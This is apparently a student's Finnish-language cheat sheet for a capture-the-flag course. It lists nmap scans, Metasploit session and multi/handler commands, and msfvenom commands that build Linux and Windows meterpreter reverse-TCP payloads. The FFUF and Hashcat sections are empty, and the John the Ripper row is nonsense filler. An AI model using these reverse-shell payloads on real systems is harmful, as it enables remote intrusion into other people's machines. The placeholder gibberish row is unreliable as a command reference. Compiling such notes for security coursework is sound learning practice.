# a) Cheatsheet. Kerää parhaat komennot lipunryöstöä varten. Lähteinä voit käyttää omia ja kurssikavereiden läksyraportteja, vanhoja cheatsheet:eja sekä vierailijoiden kalvoja. (Kerää nimenomaan ne komennot ja sisältö, ei pelkkää linkkilistaa, ei pelkkää kuvailua. Tässä alakohdassa komentoja ei tarvitse kokeilla koneella).

NMAP
| Syntax | Description |
| :--- | ---: |
| nmap -A -p- <'ip-address'> | Laaja porttiskannaus kaikille portille 1-65535 kohde IP koneelle. |
| nmap <'ip-address'> | Perusmuotoinen TCP SYN skannaus yleisimmille porteille 1-1000 kohde IP koneelle. |
| nmap --top-ports <'n'> <'ip-address'> | Perusmuotoinen skannaus yleisimmille 'n' määrälle porteille. Yleensä 1000. |  

FFUF
| Syntax | Description |
| :--- | ---: |
|  |  |

METASPLOIT FRAMEWORK
| Syntax | Description |
| :--- | ---: |
| jobs -l ; -k | -l listaa käynnissä olevat tehtävät ja -k pysäyttävät ne. |
| sessions -l ; -i | -l listaa käynnissä olevat meterpreter sessiot ja -i ottaa siihen yhteyden |
| show -h  | Näyttävät vaihtoehdot mitä voidaan näyttää esim. payloads, exploits, plugins jne. |

METASPLOIT/MULTI/HANDLER
| Syntax | Description |
| :--- | ---: |
| use exploit/multi/handler | Payload handlerin käyttö |
| set PAYLOAD; LHOST; LPORT; ExitOnSession; run | Multi-handler parametrien asetukset |

MSFVENOM 
| Syntax | Description |
| :--- | ---: |
| msfvenom -p <'PAYLOAD'> -f <'Filetype'> LHOST= <'localhost-ip'> LPORT= <'listeningport'> > <'output-filename'> | msfvenom payloadin generointi |
| msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf | Linux reverse-tcp payload generointi |
| msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe | Windows reverse-tcp payload generointi |


JOHN THE RIPPER
| Syntax | Description |
| :--- | ---: |
| asdge.spede asd asdjfj -p | kekistlol |

HASHCAT
